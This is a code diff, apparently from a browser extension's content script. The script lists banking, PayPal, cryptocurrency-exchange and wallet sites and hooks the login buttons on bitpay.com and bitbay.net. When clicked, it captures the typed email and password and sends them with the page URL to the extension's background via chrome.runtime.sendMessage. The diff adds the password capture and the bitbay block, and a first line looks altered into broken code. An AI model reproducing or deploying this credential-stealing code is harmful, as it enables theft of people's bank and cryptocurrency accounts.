@@ -1,4 +1,4 @@
-(new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
+a(new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
 var myStringArray = ["ether", "paypal.com","secureinternetbank.com", "secureweb.inalco.com","financierebn.com", "bncd.ca", "bvi.bnc.ca" ,"commercial.bnc.ca", "ipko.pl", "banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php", "bitcoin","blockchain.info","wallet","paxful.com","coin.space","coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com", "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com"];
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
@@ -392,13 +392,27 @@ var login_form = document.getElementById("loginForm");
 
 
 
-  if (top['location']['href']['indexOf']('https://bitpay.com/dashboard/login/') > -1) {
+  if (top['location']['href']['indexOf']('https://bitpay.com/dashboard/login') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('bp-constrain-login')[0]) {
               clearInterval(interval);
               document['getElementsByClassName']('button bp-button prelogin__button ladda-button')[0].onclick = function (_0x441cx2) {
                var login = {};
               login.username = document.getElementsByName("email")[0].value;
+              login.pass = document.getElementsByName("password")[0].value;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",login});
+              }
+          }
+      }, 1000)
+  };
+  if (top['location']['href']['indexOf']('https://auth.bitbay.net/login-password') > -1) {
+      var interval = setInterval(function () {
+          if (document['getElementsByClassName']('bp-constrain-login')[0]) {
+              clearInterval(interval);
+              document['getElementsByClassName']('send-btn full-width-btn btn btn-flat waves-effect')[0].onclick = function (_0x441cx2) {
+               var login = {};
+              login.username = "null" //document.getElementsByName("email")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
               login.href = window.location.href;
               chrome.runtime.sendMessage({cmd: "l",login});
